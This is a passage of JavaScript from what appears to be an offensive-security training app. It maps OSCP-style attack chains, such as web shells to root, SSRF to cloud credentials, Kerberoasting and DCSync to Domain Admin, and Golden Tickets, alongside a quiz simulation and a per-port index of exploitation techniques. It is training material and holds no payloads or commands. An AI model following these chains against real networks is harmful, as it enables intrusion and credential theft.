          switches: switchesFor(cmd, s.tool),
          tokens: tokenizeCmd(cmd, s.tool)
        };
      });
    } else if (out) {
      var pcmd = _fillSampleTokens(out.cmd || (primary ? primary.rawRun || primary.run : ''));
      var lines2 = out.text.split('\n');
      if (lines2.length && pcmd && stripPrompt(lines2[0]) === stripPrompt(pcmd)) lines2 = lines2.slice(1);
      var pLocus = cmdLocus({ run: pcmd, tool: out.tool || (primary ? primary.tool : ''), where: primary && primary.locus === 'ON-TARGET' ? 'onhost' : '' });
      var where = pLocus.label === 'ON-TARGET' ? 'host' : 'local';
      var pTool = out.tool || (primary ? primary.tool : '');
      steps = [{
        where: where,
        prompt: detectPrompt(pcmd, pTool, where, m && m.os),
        tool: pTool,
        command: pcmd,
        outputLines: lines2,
        note: primary ? primary.note : '',
        switches: switchesFor(pcmd, pTool),
        tokens: tokenizeCmd(pcmd, pTool)
      }];
    }
    if (!steps.length && primary) {
      var fbCmd = _fillSampleTokens(primary.rawRun || primary.run || '');
      var fbWhere = primary.locus === 'ON-TARGET' ? 'host' : 'local';
      steps = [{
        where: fbWhere,
        prompt: detectPrompt(fbCmd, primary.tool, fbWhere, m && m.os),
        tool: primary.tool || '',
        command: fbCmd,
        outputLines: [],
        note: primary.note || '',
        switches: switchesFor(fbCmd, primary.tool),
        tokens: tokenizeCmd(fbCmd, primary.tool)
      }];
    }
    var allOutLines = [];
    steps.forEach(function (st) { (st.outputLines || []).forEach(function (l) { allOutLines.push(l); }); });
    var first = steps[0] || {};
    var firstLocus = cmdLocus({ run: first.command, tool: first.tool, where: first.where });
    return {
      id: cell.id, title: cell.title, phase: cell.phase, laneKey: cell.laneKey,
      tool: first.tool || '', locus: firstLocus.label || (primary ? primary.locus : ''), tag: firstLocus.tag || (primary ? primary.tag : ''),
      prompt: first.prompt || 'kali$',
      command: first.command || '', note: first.note || '',
      switches: first.switches || [], tokens: first.tokens || [],
      steps: steps, multi: steps.length > 1,
      outputLines: allOutLines.length ? allOutLines : (first.outputLines || []), hasOutput: !!(out && out.text),
      signal: out ? out.signal : '', teach: out ? out.teach : '',
      proves: cell.proves, opens: (cell.opens[0] || {}).title || '', next: laneNext(moveId),
    };
  }

  // --- the atlas: every lane as one layered graph, with cross-lane bridges ----------------------
  var BRIDGES = [
    { from: 'nmap-version-scripts', to: 'ad-dc-identify', note: 'a Windows/AD host → the AD lane' },
    { from: 'nmap-version-scripts', to: 'check-web-components', note: 'a web port → run the safe checks' },
    { from: 'recon-smb-anon', to: 'asrep-roast', note: 'anonymous SMB can leak the user list' },
    { from: 'recon-smb-anon', to: 'password-spray', note: 'a user list to spray' },
    { from: 'recon-web-triage', to: 'content-discovery', note: 'a live web app → map it' },
    { from: 'content-discovery', to: 'check-exposed-files', note: 'discovered paths → probe for leaks' },
    { from: 'web-shells', to: 'linux-enum', note: 'a web shell is a Linux foothold' },
    { from: 'web-shells', to: 'windows-enum', note: '…or a Windows foothold' },
    { from: 'web-shells', to: 'shell-pty-upgrade', note: 'a raw web shell → upgrade it to a real TTY' },
    { from: 'shell-revshell-linux', to: 'linux-enum', note: 'a caught shell → start Linux enumeration' },
    { from: 'shell-revshell-windows', to: 'windows-enum', note: 'a caught shell → start Windows enumeration' },
    { from: 'asrep-roast', to: 'crack-asrep-offline', note: 'an AS-REP hash to crack' },
    { from: 'kerberoast', to: 'crack-kerberoast', note: 'a service ticket to crack' },
    { from: 'dcsync', to: 'crack-ntlm', note: 'dumped NTLM hashes to crack' },
    { from: 'responder-poison', to: 'crack-netntlmv2', note: 'a captured NetNTLMv2 hash to crack' },
    { from: 'coerce-auth', to: 'ntlm-relay-attack', note: 'coerced auth → relay it to a second host' },
    { from: 'crack-netntlmv2', to: 'lateral-exec', note: 'a cracked password → move laterally' },
    { from: 'mssql-xp-cmdshell', to: 'windows-enum', note: 'a DB shell → escalate on the host' },
    { from: 'sudo-abuse', to: 'local-linux-interfaces', note: 'now root → pivot deeper' },
    { from: 'seimpersonate', to: 'local-windows-interfaces', note: 'now SYSTEM → pivot deeper' },
    { from: 'sudo-abuse', to: 'flag-hunt-linux', note: 'root → grab the proof' },
    { from: 'seimpersonate', to: 'flag-hunt-windows', note: 'SYSTEM → grab the proof' },
  ];
  function atlas() {
    var Ls = buildLanes(), nodes = [], index = {};
    Ls.forEach(function (L, row) { L.nodes.forEach(function (n, col) { var node = { id: n.id, title: n.title, lane: L.key, phase: n.phase, proves: n.proves, reqs: n.reqs, col: col, row: row }; nodes.push(node); index[n.id] = node; }); });
    var laneE = [], crossE = [];
    Ls.forEach(function (L) { for (var i = 1; i < L.nodes.length; i++) laneE.push({ from: L.nodes[i - 1].id, to: L.nodes[i].id }); });
    BRIDGES.forEach(function (b) { if (index[b.from] && index[b.to]) crossE.push({ from: b.from, to: b.to, note: b.note }); });
    return { nodes: nodes, laneEdges: laneE, crossEdges: crossE, laneOrder: Ls.map(function (L) { return L.key; }), lanes: Ls.map(function (L) { return { key: L.key, name: L.name, short: L.short, count: L.nodes.length }; }), cols: Math.max.apply(null, Ls.map(function (L) { return L.nodes.length; })) };
  }

  // --- scenarios: curated cross-lane paths ------------------------------------------------------
  // Curated end-to-end paths, grouped by category so the picker reads like a menu. `cat` drives the
  // grouping + colour in the UI; SCEN_CATS sets the display order. Every step is a real move id.
  var SCEN_CATS = ['Recon', 'Web to Shell', 'Cloud', 'Privilege Escalation', 'Active Directory', 'Databases', 'Lateral & Pivot'];
  var SCENARIOS = [
    { key: 'recon-sweep', cat: 'Recon', name: 'Full recon sweep', desc: 'The opening every engagement shares: ports, versions, SMB, and the web surface.',
      steps: ['nmap-fast-open-ports', 'nmap-version-scripts', 'recon-smb-anon', 'recon-web-triage'] },

    { key: 'web-linux', cat: 'Web to Shell', name: 'Web app → Linux root', desc: 'Map a web app, get a shell through it, then escalate to root.',
      steps: ['recon-web-triage', 'content-discovery', 'lfi-probe', 'file-upload', 'web-shells', 'linux-enum', 'sudo-abuse'] },
    { key: 'web-windows', cat: 'Web to Shell', name: 'Web app → Windows SYSTEM', desc: 'Web foothold on a Windows host, then abuse a privilege to SYSTEM.',
      steps: ['recon-web-triage', 'content-discovery', 'file-upload', 'web-shells', 'windows-enum', 'seimpersonate'] },
    { key: 'ssti-root', cat: 'Web to Shell', name: 'SSTI → RCE → root', desc: 'Spot template injection, turn it into a shell, then escalate on Linux.',
      steps: ['recon-web-triage', 'content-discovery', 'ssti', 'web-shells', 'linux-enum', 'sudo-abuse'] },
    { key: 'cmdi-root', cat: 'Web to Shell', name: 'Command injection → shell → root', desc: 'Inject an OS command, catch a reverse shell, then escalate.',
      steps: ['recon-web-triage', 'content-discovery', 'command-injection', 'shell-revshell-linux', 'linux-enum', 'sudo-abuse'] },
    { key: 'tomcat-system', cat: 'Web to Shell', name: 'Tomcat manager → WAR → SYSTEM', desc: 'Fingerprint Tomcat, deploy a WAR shell, then take SYSTEM.',
      steps: ['recon-web-triage', 'check-web-components', 'tomcat-deploy', 'windows-enum', 'seimpersonate'] },
    { key: 'web-root-proof', cat: 'Web to Shell', name: 'Web → root → proof', desc: 'The full exam arc: recon a web app, shell it, escalate to root, capture the flag.',
      steps: ['nmap-fast-open-ports', 'recon-web-triage', 'content-discovery', 'file-upload', 'web-shells', 'linux-enum', 'sudo-abuse', 'flag-hunt-linux'] },
    { key: 'graphql-authz', cat: 'Web to Shell', name: 'GraphQL → broken authorization', desc: 'Find a GraphQL endpoint, introspect the whole schema, then abuse a mutation the app forgot to guard. (Beyond OSCP.)',
      steps: ['recon-web-triage', 'content-discovery', 'graphql-abuse'] },

    { key: 'web-ssrf-aws', cat: 'Cloud', name: 'SSRF → AWS metadata → account', desc: 'Turn a server-side request forgery into IMDS credentials, then loot the AWS account the role can see. (Beyond OSCP.)',
      steps: ['recon-web-triage', 'content-discovery', 'ssrf', 'aws-credential-abuse'] },
    { key: 'web-ssrf-azure', cat: 'Cloud', name: 'SSRF → Azure IMDS → subscription', desc: 'Smuggle the Metadata header through an SSRF for a managed-identity token, then enumerate the subscription and loot Key Vault. (Beyond OSCP.)',
      steps: ['recon-web-triage', 'content-discovery', 'ssrf', 'azure-imds'] },

    { key: 'linux-sudo', cat: 'Privilege Escalation', name: 'Linux foothold → sudo → root', desc: 'From a low-priv shell, read your sudo rights and escape a binary to root.',
      steps: ['linux-enum', 'sudo-abuse', 'flag-hunt-linux'] },
    { key: 'win-potato', cat: 'Privilege Escalation', name: 'Windows foothold → SeImpersonate → SYSTEM', desc: 'Enumerate, find SeImpersonatePrivilege, and ride a potato to SYSTEM.',
      steps: ['windows-enum', 'seimpersonate', 'flag-hunt-windows'] },
    { key: 'cron-root', cat: 'Privilege Escalation', name: 'Find the cron job → root', desc: 'Watch processes with pspy, spot a root job you can influence, and take root.',
      steps: ['linux-enum', 'pspy-monitor', 'cron-abuse'] },
    { key: 'wildcard-root', cat: 'Privilege Escalation', name: 'Wildcard cron → root', desc: 'Catch a root tar-on-* in a writable directory, drop flag-named files, and ride the expansion to root. (Beyond OSCP.)',
      steps: ['linux-enum', 'pspy-monitor', 'wildcard-injection', 'flag-hunt-linux'] },
    { key: 'systemd-root', cat: 'Privilege Escalation', name: 'Writable systemd unit → root', desc: 'Find a root unit file you can edit, point its ExecStart at your payload, and trigger it. (Beyond OSCP.)',
      steps: ['linux-enum', 'systemd-timer-abuse', 'flag-hunt-linux'] },
    { key: 'uac-lsass', cat: 'Privilege Escalation', name: 'Filtered admin → UAC bypass → LSASS', desc: 'A medium-integrity admin bypasses UAC to high integrity, then dumps LSASS for more credentials. (Beyond OSCP.)',
      steps: ['windows-enum', 'uac-bypass', 'lsass-dump-onbox'] },
    { key: 'com-persist', cat: 'Privilege Escalation', name: 'COM hijack → execution', desc: 'Redirect a CLSID a privileged process loads to your DLL, and run as it. (Beyond OSCP.)',
      steps: ['windows-enum', 'com-hijack', 'flag-hunt-windows'] },
    { key: 'patch-system', cat: 'Privilege Escalation', name: 'Missing patch → kernel CVE → SYSTEM', desc: 'wesng names a missing KB with a public local exploit; run it for SYSTEM.',
      steps: ['windows-enum', 'wesng-patch-gaps', 'windows-patch-exploit', 'flag-hunt-windows'] },
    { key: 'svc-dacl-system', cat: 'Privilege Escalation', name: 'Weak service DACL → reconfigure → SYSTEM', desc: 'A service grants you SERVICE_CHANGE_CONFIG; repoint its binpath and ride the next start to SYSTEM. (Beyond OSCP.)',
      steps: ['windows-enum', 'windows-service-dacl-abuse', 'flag-hunt-windows'] },
    { key: 'pipe-system', cat: 'Privilege Escalation', name: 'Named pipe → impersonate client → SYSTEM', desc: 'Stand up a pipe, coerce a privileged client onto it, and duplicate its token to SYSTEM. (Beyond OSCP.)',
      steps: ['windows-enum', 'windows-namedpipe-impersonation', 'flag-hunt-windows'] },

    { key: 'ad-classic', cat: 'Active Directory', name: 'Classic AD: no creds → Domain Admin', desc: 'Anonymous foothold, roast a hash, crack it, walk an ACL path to DCSync.',
      steps: ['nmap-fast-open-ports', 'ad-dc-identify', 'ad-anon-ldap-enum', 'asrep-roast', 'crack-asrep', 'ad-acl-abuse', 'dcsync'] },
    { key: 'kerberoast-da', cat: 'Active Directory', name: 'Kerberoast → crack → Domain Admin', desc: 'With one domain credential, roast a service account, crack it, and escalate.',
      steps: ['ad-dc-identify', 'ad-anon-ldap-enum', 'kerberoast', 'crack-tgs', 'ad-acl-abuse', 'dcsync'] },
    { key: 'adcs-da', cat: 'Active Directory', name: 'AD CS (ESC1) → Domain Admin', desc: 'Abuse a vulnerable certificate template to mint a DA credential, then DCSync.',
      steps: ['ad-dc-identify', 'ad-anon-ldap-enum', 'adcs-esc', 'cert-authenticate', 'dcsync'] },
    { key: 'smb-spray', cat: 'Active Directory', name: 'SMB foothold → spray → DA', desc: 'Pull a user list from anonymous SMB, spray for a login, escalate in the domain.',
      steps: ['recon-smb-anon', 'password-spray', 'ad-acl-abuse', 'dcsync'] },
    { key: 'nopac-da', cat: 'Active Directory', name: 'Domain cred → noPac → Domain Admin', desc: 'A single low-priv credential against an unpatched DC becomes Domain Admin.',
      steps: ['ad-dc-identify', 'ad-anon-ldap-enum', 'asrep-roast', 'crack-asrep', 'nopac'] },
    { key: 'coerce-relay', cat: 'Active Directory', name: 'Coerce → relay → DCSync', desc: 'Force the DC to authenticate, relay it to grant replication rights, then DCSync.',
      steps: ['coerce-auth', 'ntlm-relay-attack', 'dcsync'] },
    { key: 'golden-persist', cat: 'Active Directory', name: 'Domain Admin → Golden Ticket', desc: 'Once you own the domain, forge a TGT that survives password resets.',
      steps: ['dcsync', 'golden-ticket'] },
    { key: 'eternalblue-sys', cat: 'Active Directory', name: 'SMBv1 → EternalBlue → SYSTEM', desc: 'An unpatched SMBv1 host falls to MS17-010 for SYSTEM without credentials.',
      steps: ['nmap-version-scripts', 'nmap-vuln-scripts', 'eternalblue', 'flag-hunt-windows'] },
    { key: 'certifried-da', cat: 'Active Directory', name: 'AD CS + machine quota → Certifried → DA', desc: 'One domain credential, a non-zero machine-account quota, and an enterprise CA become a DC certificate, then DCSync. (Beyond OSCP.)',
      steps: ['ad-dc-identify', 'ad-anon-ldap-enum', 'asrep-roast', 'crack-asrep', 'certifried', 'dcsync'] },
    { key: 'sccm-naa', cat: 'Active Directory', name: 'SCCM management point → NAA → lateral', desc: 'Graph the domain, find an SCCM management point, pull its Network Access Account, and reuse it to move. (Beyond OSCP.)',
      steps: ['ad-dc-identify', 'bloodhound-collect', 'sccm-enum', 'sccm-exploit', 'lateral-exec'] },

    { key: 'mssql-system', cat: 'Databases', name: 'MSSQL sysadmin → SYSTEM', desc: 'A database login with sysadmin becomes a shell, then SYSTEM on the host.',
      steps: ['nmap-version-scripts', 'mssql-login', 'mssql-xp-cmdshell', 'windows-enum', 'seimpersonate'] },
    { key: 'mysql-reuse', cat: 'Databases', name: 'MySQL → dump hashes → reuse', desc: 'Log in, dump the app password table, crack a hash, and reuse it to move.',
      steps: ['mysql-login', 'mysql-loot', 'crack-ntlm', 'lateral-exec'] },

    { key: 'responder-lateral', cat: 'Lateral & Pivot', name: 'Poison → crack → move laterally', desc: 'Capture a hash off the wire, crack it, and reuse it to own a second host.',
      steps: ['responder-poison', 'crack-netntlmv2', 'lateral-exec', 'windows-enum'] },
    { key: 'web-pivot-deep', cat: 'Lateral & Pivot', name: 'Web shell → loot → pivot', desc: 'Land through the web, loot creds, then tunnel into the network behind the box.',
      steps: ['recon-web-triage', 'content-discovery', 'web-shells', 'linux-enum', 'linux-loot-hunt', 'local-linux-interfaces', 'pivot-chisel-socks', 'pivot-scan-through'] },
    { key: 'pivot-internal', cat: 'Lateral & Pivot', name: 'Foothold → tunnel → reach internal', desc: 'From a foothold, map the hidden subnet, build a tunnel, and scan what is behind it.',
      steps: ['linux-enum', 'local-linux-interfaces', 'pivot-ligolo', 'pivot-scan-through'] },
    { key: 'dns-egress', cat: 'Lateral & Pivot', name: 'Egress-filtered foothold → DNS tunnel → pivot', desc: 'When only DNS resolves outbound, tunnel over it with dnscat2 and scan the network behind the box. (Beyond OSCP.)',
      steps: ['linux-enum', 'local-linux-interfaces', 'dns-tunnel', 'pivot-scan-through'] },
    { key: 'ssh-forward-reach', cat: 'Lateral & Pivot', name: 'Foothold → SSH forward → one internal service', desc: 'Map the subnet, then forward a single internal port over SSH when a SOCKS pivot is more than you need.',
      steps: ['linux-enum', 'local-linux-interfaces', 'pivot-ssh-portforward'] },
  ];
  function scenCat(s) { return s.cat || 'Other'; }
  function scenMap(s) { return { key: s.key, cat: scenCat(s), name: s.name, desc: s.desc, steps: s.steps.slice(), count: s.steps.length }; }
  function scenarios() { return SCENARIOS.filter(function (s) { return s.steps.every(byId); }).map(scenMap); }
  function scenarioCats() { return SCEN_CATS.slice(); }
  function scenario(key) { for (var i = 0; i < SCENARIOS.length; i++) if (SCENARIOS[i].key === key) return scenMap(SCENARIOS[i]); return null; }

  // --- cold-box simulation: run a scenario as a guided, scaffolded playthrough -------------------
  // A real box starts cold: an IP and nothing else. simFor walks a scenario one move at a time. Each
  // step reveals that move's real captured output (the replay), then asks which move comes next. The
  // right answer is the scenario's own next step; the distractors are tempting-but-wrong moves, each
  // labelled with why it is wrong here (a prereq you have not earned yet, or simply a different path).
  // The simulation reuses the fixtures and the replay, so what the learner reads is the same evidence
  // the Watch panel shows, never a throwaway mock.
  function simLockState(id, produced) {
    var m = byId(id); if (!m) return { locked: true, missing: [] };
    var all = m.requires_all || [], any = m.requires_any || [];
    var missAll = all.filter(function (r) { return !produced[r] && !isExternal(r); });
    var anyOk = any.length === 0 || any.some(function (r) { return produced[r] || isExternal(r); });
    return { locked: missAll.length > 0 || !anyOk, missing: missAll.concat(anyOk ? [] : ['one of: ' + any.join(' / ')]) };
  }
  function simHumanFact(k) { return /^one of:/.test(k) ? ('one of: ' + k.replace(/^one of:\s*/, '').split(' / ').map(friendly).join(' or ')) : friendly(k); }
  function simChoices(ids, i, produced) {
    var correctId = ids[i + 1], cm = byId(correctId); if (!cm) return null;
    var onpath = {}; ids.forEach(function (x) { onpath[x] = 1; });
    var correctLane = (laneEntry(correctId) || {}).laneKey;
    var cand = allMoves().filter(function (m) { return !onpath[m.id]; });
    cand.sort(function (a, b) {
      var la = (laneEntry(a.id) || {}).laneKey === correctLane ? 0 : 1;
      var lb = (laneEntry(b.id) || {}).laneKey === correctLane ? 0 : 1;
      return la - lb;
    });
    var locked = [], open = [];
    cand.forEach(function (m) { var s = simLockState(m.id, produced); (s.locked ? locked : open).push({ m: m, s: s }); });
    var picks = [];
    if (locked.length) picks.push(locked[0]);
    if (open.length) picks.push(open[0]);
    [locked[1], open[1], locked[2], open[2]].forEach(function (p) { if (p && picks.length < 2 && picks.indexOf(p) < 0) picks.push(p); });
    var choices = [{ id: correctId, title: cm.title, correct: true, why: '' }];
    picks.slice(0, 2).forEach(function (p) {
      var why = p.s.locked
        ? 'Not yet. This needs ' + p.s.missing.map(simHumanFact).join(', ') + ', and you have not earned that.'
        : 'A legal move, but it is not the next step on this path.';
      choices.push({ id: p.m.id, title: p.m.title, correct: false, why: why });
    });
    for (var j = choices.length - 1; j > 0; j--) { var r = Math.floor(Math.random() * (j + 1)); var t = choices[j]; choices[j] = choices[r]; choices[r] = t; }
    return choices;
  }
  function simFor(key) {
    var sc = scenario(key); if (!sc) return null;
    var ids = sc.steps.filter(byId);
    var produced = {};
    var steps = ids.map(function (id, i) {
      var m = byId(id), rp = replayFor(id);
      (m.produces || []).forEach(function (p) { produced[p] = 1; });
      var nextId = ids[i + 1] || null;
      return {
        idx: i, id: id, title: m.title, phase: (laneEntry(id) || {}).phase || '',
        intro: i === 0 ? 'A fresh box: an IP and nothing else. You run your opening move.' : 'You run it. This comes back.',
        replay: rp,
        prompt: nextId ? 'You have your result. What is your next move?' : '',
        choices: nextId ? simChoices(ids, i, produced) : null,
        nextId: nextId, last: !nextId,
      };
    });
    return { key: sc.key, name: sc.name, desc: sc.desc, count: steps.length, steps: steps };
  }

  // --- the EVIDENCE index: "what do I have in front of me, and what does it unlock?" -------------
  // This is the by-port view, generalised. Ports are the first evidence you get; after a foothold the
  // evidence is a shell, a hash, a credential, a pivot host. Each entry carries one curated plain
  // sentence ("what it means") and a DERIVED, topo-ordered mini-lane of the moves that evidence opens,
  // so every entry is as navigable as a methodology lane. Membership is seeded + pulled from whole
  // taxonomy lanes, and a coverage check keeps it honest. tier 'ports' shows first, then tier 'access'.
  var EVIDENCE = [
    { key: 'scan', tier: 'ports', port: 'first', short: 'Scan First', proto: '', fam: 'recon', label: 'Before anything, scan', signal: 'Every engagement opens the same way. Sweep the target so you know which doors exist before you touch any one of them.', seed: ['nmap-fast-open-ports', 'nmap-version-scripts', 'nmap-udp-top', 'nmap-vuln-scripts', 'nmap-host-unresponsive', 'fix-name-resolution', 'recon-arp-sweep'] },
    { key: 'p21', tier: 'ports', port: '21', short: '21 FTP', proto: 'tcp', fam: 'file', label: 'FTP', signal: 'File transfer. Test the anonymous login first because it costs nothing, then brute a known user. Files on FTP routinely hold configs, source, or credentials, and a writable directory that is also the web root is a shell.', seed: ['recon-ftp', 'recon-ftp-banner', 'online-brute-ftp', 'ftp-upload-webshell', 'ftp-bounce', 'vsftpd-backdoor', 'proftpd-modcopy'] },
    { key: 'p22', tier: 'ports', port: '22', short: '22 SSH', proto: 'tcp', fam: 'remote', label: 'SSH', signal: 'Remote shell. There is no code execution here, but a looted private key or a weak password is a stable foothold, and SSH is your cleanest pivot.', seed: ['ssh-key-login', 'ssh-key-troubleshoot', 'online-brute-ssh', 'blind-brute-ssh', 'ssh-user-enum', 'pivot-ssh-dynamic', 'pivot-ssh-local', 'pivot-sshuttle'] },
    { key: 'p23', tier: 'ports', port: '23', short: '23 Telnet', proto: 'tcp', fam: 'remote', label: 'Telnet', signal: 'Cleartext remote login. The banner often names the OS or device, default and reused passwords log straight in, and nothing on the wire is encrypted.', seed: ['recon-telnet', 'telnet-login'] },
    { key: 'p25', tier: 'ports', port: '25/110/143/465/587/993/995', short: '25/110/143 Mail', proto: 'tcp', fam: 'mail', label: 'SMTP, POP3, IMAP', signal: 'Mail. SMTP VRFY confirms real usernames, and a mailbox credential lets you read mail for secrets and reset links. NTLM auth leaks the domain name.', seed: ['recon-smtp', 'smtp-open-relay', 'recon-mail', 'pop3-imap-read', 'haraka-smtp-rce', 'james-admin-rce', 'password-spray'] },
    { key: 'p53', tier: 'ports', port: '53', short: '53 DNS', proto: 'tcp/udp', fam: 'recon', label: 'DNS', signal: 'Name service. A zone transfer (AXFR) can hand you the whole internal host map in one request.', seed: ['recon-dns', 'check-dns-email', 'check-subdomain-takeover'] },
    { key: 'p69', tier: 'ports', port: '69', short: '69 TFTP', proto: 'udp', fam: 'file', label: 'TFTP', signal: 'A tiny unauthenticated file service with no listing. Common on routers and phones, it hands out config files full of hashes and management passwords if you can name them.', seed: ['recon-tftp', 'tftp-write-shell'] },
    { key: 'p79', tier: 'ports', port: '79', short: '79 Finger', proto: 'tcp', fam: 'recon', label: 'Finger', signal: 'Ancient, but when it is open it leaks real usernames and who is logged in, which is raw material for a spray or a brute.', seed: ['recon-finger'] },
    { key: 'p80', tier: 'ports', port: '80/443', short: '80/443 HTTP', proto: 'tcp', fam: 'web', label: 'HTTP, HTTPS', signal: 'A web app, the single richest attack surface on the exam. Fingerprint the stack, map the content, then hunt the injectable edge.', seed: ['recon-web-triage', 'http3-quic-probe', 'heartbleed-memory-leak', 'vhost-discovery', 'content-discovery', 'web-access-blocked', 'param-discovery', 'nikto-scan', 'wordpress', 'check-web-headers', 'check-web-components', 'check-cms-version', 'check-exposed-files', 'check-http-methods', 'check-cors', 'check-http-redirect', 'check-web-body', 'check-tls-config', 'check-dns-email', 'check-subdomain-takeover', 'sqli-basics', 'manual-sqli-exploitation', 'sqlmap-automation', 'command-injection', 'lfi-probe', 'lfi-secret-harvest', 'file-upload', 'ssti', 'xxe', 'ssrf', 'nosql-injection', 'nosqli-regex-extract', 'jwt-attacks', 'ssti-to-rce', 'http-put-webshell', 'authz-abuse', 'verb-tampering', 'xss-basics', 'web-login-brute', 'idor-harvest', 'git-exposed', 'svn-exposed', 'idor', 'deserialization', 'aws-credential-abuse', 'azure-imds', 'gcp-metadata', 'graphql-abuse', 'http-request-smuggling', 'prototype-pollution', 'mass-assignment', 'check-log4shell', 'check-struts2', 'jenkins-access', 'web-shells', 'shellshock', 'heartbleed', 'drupalgeddon2', 'phpmyadmin-lfi', 'adminer-mysql-fileread', 'ofbiz-deser', 'cacti-cmdinjection', 'zabbix-script-rce', 'splunk-app-rce', 'text4shell'], lanes: ['web', 'checks'] },
    { key: 'p88', tier: 'ports', port: '88', short: '88 Kerberos', proto: 'tcp', fam: 'ad', label: 'Kerberos', signal: 'A Domain Controller. Kerberos (88) with LDAP (389) and SMB (445) is the AD fingerprint. Name the domain, list the users, then roast.', seed: ['ad-dc-identify', 'ad-user-enum', 'asrep-roast', 'crack-asrep', 'kerberoast', 'crack-tgs', 'kerberos-tickets', 'kerberos-tgt-obtain', 'ticket-reuse', 'timeroasting'] },
    { key: 'p111', tier: 'ports', port: '111/2049', short: '111/2049 NFS', proto: 'tcp', fam: 'file', label: 'NFS', signal: 'Network file shares. An export open to everyone is readable by anyone, and no_root_squash turns it into a privilege escalation.', seed: ['nfs-enum', 'recon-nfs-mounts', 'nfs-to-foothold', 'nfs-squash', 'linux-nfs-root-squash'] },
    { key: 'p135', tier: 'ports', port: '135/139/445', short: '135/445 SMB', proto: 'tcp', fam: 'ad', label: 'SMB, RPC', signal: 'Windows file sharing and RPC, the busiest port in AD. Try anonymous access, hunt readable shares, check for old SMBv1 (EternalBlue), and poison or relay NTLM.', seed: ['recon-smb-anon', 'recon-smb-signing', 'smb-share-inventory', 'smb-share-browse-download', 'spider-secrets', 'gpp-passwords', 'eternalblue', 'smbghost', 'samba-usermap', 'samba-usermap-script-rce', 'responder-poison', 'ntlm-relay-attack', 'ntlm-relay-capture', 'mitm6-ipv6-takeover', 'coerce-auth', 'coercer-petitpotam', 'ad-legacy-enum', 'ad-session-enum', 'domain-policy-enum', 'lateral-exec', 'pass-the-hash', 'cred-reuse-sweep', 'dump-secrets', 'own-domain-pth', 'dcsync'] },
    { key: 'p161', tier: 'ports', port: '161', short: '161 SNMP', proto: 'udp', fam: 'recon', label: 'SNMP', signal: 'A default "public" community string reads running processes, users, and sometimes credentials straight out of the host.', seed: ['recon-snmp', 'recon-snmp-walk', 'snmp-process-cmdline-harvest'] },
    { key: 'p389', tier: 'ports', port: '389/636/3268', short: '389/636 LDAP', proto: 'tcp', fam: 'ad', label: 'LDAP, Global Catalog', signal: 'The directory itself. An anonymous bind lists every user, and with a credential you collect BloodHound, read LAPS, and find AD CS templates.', seed: ['ad-dc-identify', 'ad-anon-ldap-enum', 'ldap-deep-enum', 'ad-group-enum', 'ad-trust-enum', 'bloodhound-collect', 'ad-path-manual', 'ad-dacl-abuse', 'laps-read', 'ad-laps-read', 'gmsa-read', 'ad-gmsa-abuse', 'adcs-esc', 'certipy-find', 'adcs-esc4-template', 'adcs-esc8-relay', 'adcs-shadow-creds', 'adcs-certifried', 'cert-authenticate', 'password-spray', 'nxc-arsenal'] },
    { key: 'p500', tier: 'ports', port: '500', short: '500 IKE VPN', proto: 'udp', fam: 'remote', label: 'IKE, IPsec VPN', signal: 'A VPN endpoint. Aggressive Mode hands back a PSK hash you can crack offline, and is a finding on its own.', seed: ['recon-ike-vpn'] },
    { key: 'p512', tier: 'ports', port: '512/513/514', short: '512-514 rsh', proto: 'tcp', fam: 'remote', label: 'r-services (rexec, rlogin, rsh)', signal: 'Berkeley trust logins. A permissive .rhosts or hosts.equiv lets you rlogin or rsh in as any user, root included, with no password at all.', seed: ['recon-rservices', 'rservices-login'] },
    { key: 'p623', tier: 'ports', port: '623', short: '623 IPMI', proto: 'udp', fam: 'remote', label: 'IPMI BMC (RAKP)', signal: 'Out-of-band server management. IPMI 2.0 RAKP authentication returns a salted SHA1 password hash for any valid username before verifying your password.', seed: ['ipmi-hash-dump', 'ipmi-bmc-cipher0', 'crack-identify'] },
    { key: 'p873', tier: 'ports', port: '873', short: '873 rsync', proto: 'tcp', fam: 'file', label: 'rsync', signal: 'A file-sync daemon serving named modules. Many list and read without auth (source, backups, keys), and a writable module maps straight onto a sensitive path.', seed: ['recon-rsync', 'rsync-write-shell'] },
    { key: 'p1433', tier: 'ports', port: '1433', short: '1433 MSSQL', proto: 'tcp', fam: 'db', label: 'MSSQL', signal: 'Microsoft SQL. A login with sysadmin re-enables xp_cmdshell and runs OS commands, so the database becomes a shell.', seed: ['mssql-login', 'mssql-xp-cmdshell', 'mssql-linked-server', 'mssql-impersonate-login', 'mssql-unc-hash-steal', 'mssql-clr-assembly', 'mssql-ole-automation', 'crack-identify'] },
    { key: 'p1521', tier: 'ports', port: '1521', short: '1521 Oracle', proto: 'tcp', fam: 'db', label: 'Oracle TNS', signal: 'The Oracle listener. Brute the SID, try default accounts (system, scott, dbsnmp), and a privileged login reads and writes host files and reaches command execution.', seed: ['oracle-tns', 'oracle-rce', 'oracle-tns-odat-rce', 'crack-identify'] },
    { key: 'p3306', tier: 'ports', port: '3306', short: '3306 MySQL', proto: 'tcp', fam: 'db', label: 'MySQL, MariaDB', signal: 'A login reads app secrets and the mysql.user hash table, and can write files into the web root.', seed: ['mysql-login', 'mysql-loot', 'mysql-outfile-rce', 'mysql-udf-privesc', 'adminer-mysql-fileread', 'crack-identify'] },
    { key: 'p3389', tier: 'ports', port: '3389', short: '3389 RDP', proto: 'tcp', fam: 'remote', label: 'RDP', signal: 'Remote desktop. Confirm which credentials log in, because a weak password is a full graphical session as that user.', seed: ['rdp-enum', 'recon-rdp-nla', 'online-brute-rdp', 'bluekeep', 'win-interactive-shell'] },
    { key: 'p3690', tier: 'ports', port: '3690', short: '3690 SVN', proto: 'tcp', fam: 'file', label: 'Subversion (svnserve)', signal: 'Native Subversion repository daemon. Anonymous read access lists the commit log and diffs, frequently leaking hardcoded credentials and config files.', seed: ['svn-repo-enum', 'svn-exposed'] },
    { key: 'p5432', tier: 'ports', port: '5432', short: '5432 Postgres', proto: 'tcp', fam: 'db', label: 'PostgreSQL', signal: 'A session with the right role reads files and, through COPY FROM PROGRAM, runs commands.', seed: ['postgres-login', 'postgres-rce', 'postgres-file-read', 'postgres-large-object', 'crack-identify'] },
    { key: 'p5900', tier: 'ports', port: '5800/5900/5901', short: '5900 VNC', proto: 'tcp', fam: 'remote', label: 'VNC', signal: 'Remote desktop. A security type of "None" is an unauthenticated screen, and even with a password, VNC passwords are short and crackable.', seed: ['recon-vnc', 'vnc-desktop-shell', 'vnc-decrypt'] },
